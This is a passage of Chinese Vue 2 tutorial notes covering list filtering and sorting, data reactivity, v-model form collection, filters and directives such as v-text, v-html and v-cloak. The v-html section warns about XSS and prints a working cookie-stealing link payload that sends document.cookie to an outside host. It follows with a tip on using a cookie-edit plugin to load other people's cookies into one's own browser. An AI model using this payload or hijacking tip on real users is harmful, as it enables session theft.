			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>请输入名字<span class="token punctuation">&quot;</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>keyWord<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>sortType = 2<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>年龄升序<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>sortType = 1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>年龄降序<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>sortType = 0<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>原顺序<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span>
				<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>(p,index) of filPerons<span class="token punctuation">&quot;</span></span> <span class="token attr-name">:key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>p.id<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
					{{p.name}}-{{p.age}}-{{p.sex}}
					<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
				<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>js</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
				el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>
				data<span class="token operator">:</span><span class="token punctuation">{</span>
					keyWord<span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">,</span>
					sortType<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment">//0原顺序 1降序 2升序</span>
					persons<span class="token operator">:</span><span class="token punctuation">[</span>
						<span class="token punctuation">{</span>id<span class="token operator">:</span><span class="token string">'001'</span><span class="token punctuation">,</span>name<span class="token operator">:</span><span class="token string">'马冬梅'</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token number">30</span><span class="token punctuation">,</span>sex<span class="token operator">:</span><span class="token string">'女'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
						<span class="token punctuation">{</span>id<span class="token operator">:</span><span class="token string">'002'</span><span class="token punctuation">,</span>name<span class="token operator">:</span><span class="token string">'周冬雨'</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token number">31</span><span class="token punctuation">,</span>sex<span class="token operator">:</span><span class="token string">'女'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
						<span class="token punctuation">{</span>id<span class="token operator">:</span><span class="token string">'003'</span><span class="token punctuation">,</span>name<span class="token operator">:</span><span class="token string">'周杰伦'</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token number">18</span><span class="token punctuation">,</span>sex<span class="token operator">:</span><span class="token string">'男'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
						<span class="token punctuation">{</span>id<span class="token operator">:</span><span class="token string">'004'</span><span class="token punctuation">,</span>name<span class="token operator">:</span><span class="token string">'温兆伦'</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token number">19</span><span class="token punctuation">,</span>sex<span class="token operator">:</span><span class="token string">'男'</span><span class="token punctuation">}</span>
					<span class="token punctuation">]</span>
				<span class="token punctuation">}</span><span class="token punctuation">,</span>
				computed<span class="token operator">:</span><span class="token punctuation">{</span>
					<span class="token function">filPerons</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                        <span class="token comment">//indexOf判断是否包含</span>
						<span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>persons<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">p</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
							<span class="token keyword">return</span> p<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>keyWord<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span>
						<span class="token punctuation">}</span><span class="token punctuation">)</span>
						<span class="token comment">//判断一下是否需要排序</span>
						<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>sortType<span class="token punctuation">)</span><span class="token punctuation">{</span>
							arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">p1<span class="token punctuation">,</span>p2</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
								<span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>sortType <span class="token operator">===</span> <span class="token number">1</span> <span class="token operator">?</span> p2<span class="token punctuation">.</span>age<span class="token operator">-</span>p1<span class="token punctuation">.</span>age <span class="token operator">:</span> p1<span class="token punctuation">.</span>age<span class="token operator">-</span>p2<span class="token punctuation">.</span>age
							<span class="token punctuation">}</span><span class="token punctuation">)</span>
						<span class="token punctuation">}</span>
						<span class="token keyword">return</span> arr
					<span class="token punctuation">}</span>
				<span class="token punctuation">}</span>
			<span class="token punctuation">}</span><span class="token punctuation">)</span> 
</code></pre></div><h3 id="_4-data原理"><a href="#_4-data原理" class="header-anchor">#</a> 4，data原理*</h3> <p>一般vue的data有几种步骤，一开始data加工然后到_data,再使用代理添加到vue对象中。</p> <p>这里主要解释data加工然后到_data的过程原理。</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!--只说明一层结构的情况--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
			<span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token punctuation">{</span>
				name<span class="token operator">:</span><span class="token string">'尚硅谷'</span><span class="token punctuation">,</span>
				address<span class="token operator">:</span><span class="token string">'北京'</span><span class="token punctuation">,</span>
			<span class="token punctuation">}</span>

			<span class="token comment">//创建一个监视的实例对象，用于监视data中属性的变化</span>
			<span class="token keyword">const</span> obs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Observer</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>		
			console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obs<span class="token punctuation">)</span>	

			<span class="token comment">//准备一个vm实例对象</span>
			<span class="token keyword">let</span> vm <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
			vm<span class="token punctuation">.</span>_data <span class="token operator">=</span> data <span class="token operator">=</span> obs

			<span class="token keyword">function</span> <span class="token function">Observer</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
				<span class="token comment">//汇总对象中所有的属性形成一个数组</span>
				<span class="token keyword">const</span> keys <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>
				<span class="token comment">//遍历</span>
				keys<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">k</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
					Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>k<span class="token punctuation">,</span><span class="token punctuation">{</span>
						<span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
							<span class="token keyword">return</span> obj<span class="token punctuation">[</span>k<span class="token punctuation">]</span>
						<span class="token punctuation">}</span><span class="token punctuation">,</span>
						<span class="token function">set</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">{</span>
							console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>k<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
							obj<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> val
						<span class="token punctuation">}</span>
					<span class="token punctuation">}</span><span class="token punctuation">)</span>
				<span class="token punctuation">}</span><span class="token punctuation">)</span>
			<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>总结</strong></p> <p><strong>data数据的添加以及数组的特殊处理</strong></p> <p>​     说明：一般在data添加对象属性值时都会有getter和setter，即响应式数据。不过数组比较特殊，没有这两个方法，所以直接修改数组值不会引起页面的改变，需要特殊处理。Vue中重新包装了数组的一些操作方法，能够在调用时重新解析模板。</p> <p><strong>Vue监视数据的原理</strong>：</p> <p>​        1. vue会监视data中所有层次的数据。</p> <p>​        2. 如何监测对象中的数据？</p> <p>​                通过setter实现监视，且要在new Vue时就传入要监测的数据。</p> <p>​                  (1).对象中后追加的属性，Vue默认不做响应式处理</p> <p>​                  (2).如需给后添加的属性做响应式，请使用如下API：</p> <p>​                          Vue.set(target，propertyName/index，value) 或</p> <p>​                          vm.$set(target，propertyName/index，value)</p> <p>​        3. 如何监测数组中的数据？</p> <p>​                  通过包裹数组更新元素的方法实现，本质就是做了两件事：</p> <p>​                    (1).调用原生对应的方法对数组进行更新。</p> <p>​                    (2).重新解析模板，进而更新页面。</p> <p>​        4.在Vue修改数组中的某个元素一定要用如下方法：</p> <p>​              1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()</p> <p>​              2.Vue.set() 或 vm.$set()</p> <p>​</p> <p>​        特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象(data) 添加属性！！！</p> <p><strong>简单示例</strong></p> <p>data数据</p> <div class="language-js extra-class"><pre class="language-js"><code>data<span class="token operator">:</span><span class="token punctuation">{</span>
	student<span class="token operator">:</span><span class="token punctuation">{</span>
        name<span class="token operator">:</span><span class="token string">'tom'</span><span class="token punctuation">,</span>
        age<span class="token operator">:</span><span class="token number">18</span><span class="token punctuation">,</span>
        hobby<span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">'抽烟'</span><span class="token punctuation">,</span><span class="token string">'喝酒'</span><span class="token punctuation">,</span><span class="token string">'烫头'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        friends<span class="token operator">:</span><span class="token punctuation">[</span>
              <span class="token punctuation">{</span>name<span class="token operator">:</span><span class="token string">'jerry'</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token number">35</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
              <span class="token punctuation">{</span>name<span class="token operator">:</span><span class="token string">'tony'</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token number">36</span><span class="token punctuation">}</span>
         <span class="token punctuation">]</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
</code></pre></div><p>给数组添加元素</p> <p>方法中添加</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">.</span>hobby<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'开车'</span><span class="token punctuation">)</span>   <span class="token comment">//第一种,使用vue重新封装的数组方法</span>
Vue<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">.</span>hobby<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'开车'</span><span class="token punctuation">)</span>    <span class="token comment">//第二种</span>
<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">.</span>hobby<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'开车'</span><span class="token punctuation">)</span>  <span class="token comment">//第三种</span>
</code></pre></div><p>给对象添加属性</p> <div class="language-js extra-class"><pre class="language-js"><code>Vue<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">,</span><span class="token string">'sex'</span><span class="token punctuation">,</span><span class="token string">'男'</span><span class="token punctuation">)</span>    <span class="token comment">//第一种</span>
<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">,</span><span class="token string">'sex'</span><span class="token punctuation">,</span><span class="token string">'男'</span><span class="token punctuation">)</span>  <span class="token comment">//第二种</span>
</code></pre></div><h2 id="二-收集表单数据"><a href="#二-收集表单数据" class="header-anchor">#</a> 二，收集表单数据</h2> <p>v-model收集表单数据：</p> <p>​          若：<input type="text">，则v-model收集的是value值，用户输入的就是value值。</p> <p>​          若：<input type="radio">，则v-model收集的是value值，且要给标签配置value值。</p> <p>​          若：<input type="checkbox"></p> <p>​              1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）</p> <p>​              2.配置input的value属性:</p> <p>​                  (1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）</p> <p>​                  (2)v-model的初始值是数组，那么收集的的就是value组成的数组</p> <p>​          备注：v-model的三个修饰符：</p> <p>​                  lazy：失去焦点再收集数据</p> <p>​                  number：输入字符串转为有效的数字</p> <p>​                  trim：输入首尾空格过滤</p> <p><strong>修饰符示例</strong></p> <p>lazy：失去焦点再收集数据</p> <div class="language-html extra-class"><pre class="language-html"><code>其他信息：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">v-model.lazy</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>userInfo.other<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>number：输入字符串转为有效的数字</p> <div class="language-html extra-class"><pre class="language-html"><code>年龄：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>number<span class="token punctuation">&quot;</span></span> <span class="token attr-name">v-model.number</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>userInfo.age<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>trim：输入首尾空格过滤</p> <div class="language-html extra-class"><pre class="language-html"><code>账号：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">v-model.trim</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>userInfo.account<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h2 id="三-过滤器"><a href="#三-过滤器" class="header-anchor">#</a> 三，过滤器</h2> <p>过滤器：</p> <p>​        定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。</p> <p>​        语法：</p> <p>​            1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}</p> <p>​            2.使用过滤器： 或 v-bind:属性 = &quot;xxx | 过滤器名&quot;</p> <p>​        备注：</p> <p>​            1.过滤器也可以接收额外参数、多个过滤器也可以串联</p> <p>​            2.并没有改变原本的数据, 是产生新的对应的数据</p> <p><strong>以时间戳示例</strong></p> <p>借助于第三方库来进行格式化</p> <p><a href="https://www.bootcdn.cn/dayjs/" target="_blank" rel="noopener noreferrer">dayjs<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>或<a href="https://www.bootcdn.cn/moment.js/" target="_blank" rel="noopener noreferrer">moment.js<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h3 id="_1-普通使用"><a href="#_1-普通使用" class="header-anchor">#</a> <strong>1，普通使用</strong></h3> <p>显示</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- 过滤器实现,time为data中需要特点格式化的对象 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>现在是：{{time | timeFormater}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>定义过滤器</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//局部过滤器，跟data，methods等同级</span>
filters<span class="token operator">:</span><span class="token punctuation">{</span>
    <span class="token function">timeFormater</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token comment">// console.log('@',value)</span>
        <span class="token keyword">return</span> <span class="token function">dayjs</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="_2-传参使用"><a href="#_2-传参使用" class="header-anchor">#</a> <strong>2，传参使用</strong></h3> <p>显示</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- 过滤器实现（传参），并且可以进行多次格式化 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>定义过滤器</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//局部过滤器</span>
filters<span class="token operator">:</span><span class="token punctuation">{</span>
        <span class="token function">timeFormater</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>str<span class="token operator">=</span><span class="token string">'YYYY年MM月DD日 HH:mm:ss'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token function">dayjs</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>
       <span class="token punctuation">}</span><span class="token punctuation">,</span>
       <span class="token comment">//这里的value为前面过滤器的返回值</span>
        <span class="token function">mySlice</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> value<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="_3-推荐"><a href="#_3-推荐" class="header-anchor">#</a> 3，推荐</h3> <p>一般推荐全局使用，在Vue创建前就先定义好过滤器</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//全局过滤器</span>
Vue<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token string">'timeFormater'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">dayjs</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">'YYYY年MM月DD日'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

Vue<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token string">'mySlice'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> value<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h2 id="四-内置指令"><a href="#四-内置指令" class="header-anchor">#</a> 四，内置指令</h2> <h3 id="_1-v-text指令"><a href="#_1-v-text指令" class="header-anchor">#</a> 1，v-text指令</h3> <p>1.作用：向其所在的节点中渲染文本内容。</p> <p>2.与插值语法的区别：v-text会替换掉节点中的内容，则不会。</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">v-text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>str<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//div中依旧显示&lt;h3&gt;你好啊！&lt;/h3&gt;</span>
data<span class="token operator">:</span><span class="token punctuation">{</span>
	name<span class="token operator">:</span><span class="token string">'尚硅谷'</span><span class="token punctuation">,</span>
	str<span class="token operator">:</span><span class="token string">'&lt;h3&gt;你好啊！&lt;/h3&gt;'</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="_2-v-html指令"><a href="#_2-v-html指令" class="header-anchor">#</a> 2，v-html指令</h3> <p>1.作用：向指定节点中渲染包含html结构的内容。</p> <p>2.与插值语法的区别：</p> <p>​     (1).v-html会替换掉节点中所有的内容，则不会。</p> <p>​     (2).v-html可以识别html结构。</p> <p>3.严重注意：v-html有安全性问题！！！！</p> <p>​      (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。</p> <p>​      (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！</p> <p><strong>示例</strong></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">v-html</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>str2<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//如果下面字符串渲染到页面，用户点击时会将用户浏览器的cookie内容发送其他人的服务器，不安全</span>
data<span class="token operator">:</span><span class="token punctuation">{</span>
	str2<span class="token operator">:</span><span class="token string">'&lt;a href=javascript:location.href=&quot;http://www.baidu.com?&quot;+document.cookie&gt;兄弟我找到你想要的资源了，快来！&lt;/a&gt;'</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
</code></pre></div><p>需要注意：如果需要其他人浏览器cookie的数据，可以使用cookie-edit插件，批量复制到你自己的火狐浏览器。</p> <h3 id="_3-v-cloak指令"><a href="#_3-v-cloak指令" class="header-anchor">#</a> 3，v-cloak指令</h3> <p>1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。</p> <p>2.使用css配合v-cloak可以解决网速慢时页面展示出的问题。</p> <p><strong>示例</strong></p> <p>如果没有设置v-cloak，那么会在vue.js未导入时就渲染到页面，但只显name，并不会显示name值。因此需要设置v-cloak来让页面资源引入之后再对页面进行显示。</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>root<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">v-cloak</span><span class="token punctuation">&gt;</span></span>{{name}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
   <span class="token comment">&lt;!-- 下面会在5秒延迟之后再发送vue.js文件 --&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://localhost:8080/resource/5s/vue.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
   <span class="token comment">/*vue接管容器后会删除v-cloak,*/</span>
    <span class="token selector">[v-cloak]</span><span class="token punctuation">{</span>
        <span class="token property">display</span><span class="token punctuation">:</span>none<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="_5-v-once指令"><a href="#_5-v-once指令" class="header-anchor">#</a> 5，v-once指令</h3> <p>1.v-once所在节点在初次动态渲染后，就视为静态内容了。</p> <p>2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。</p> <p><strong>示例</strong></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- 设置了v-once之后，n就只会显示初始值，按钮点击之后依旧不变 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">v-once</span><span class="token punctuation">&gt;</span></span>初始化的n值是:{{n}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>
